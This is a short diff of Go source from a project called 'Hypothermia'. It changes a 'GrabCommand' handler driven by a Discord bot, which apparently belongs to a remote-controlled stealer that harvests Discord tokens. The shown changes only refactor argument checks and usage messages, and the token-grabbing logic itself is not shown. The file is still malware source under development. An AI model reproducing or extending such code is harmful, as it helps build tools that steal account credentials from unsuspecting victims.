@@ -1,14 +1,18 @@
 package commands
 
 import (
+	"fmt"
+
+	"Hypothermia/src/misc"
 	"Hypothermia/src/utils/grabber"
+
 	"github.com/bwmarrin/discordgo"
 )
 
 const (
 	grabUsage string = "[discord]"
 
-	gravArgsError string = "🟥 Expected 1 argument."
+	grabArgsError string = "🟥 Expected 1 argument."
 	gravUseError  string = "🟥 Invalid argument."
 
 	grabNoTokens   string = "🟨 No tokens found."
@@ -19,7 +23,7 @@ const (
 
 func (*GrabCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
 	if len(args) == 0 {
-		s.ChannelMessageSendReply(m.ChannelID, gravArgsError+"\nUsage: "+grabUsage, m.Reference())
+		s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(misc.USAGE_F, grabArgsError, grabUsage), m.Reference())
 		return
 	}
 
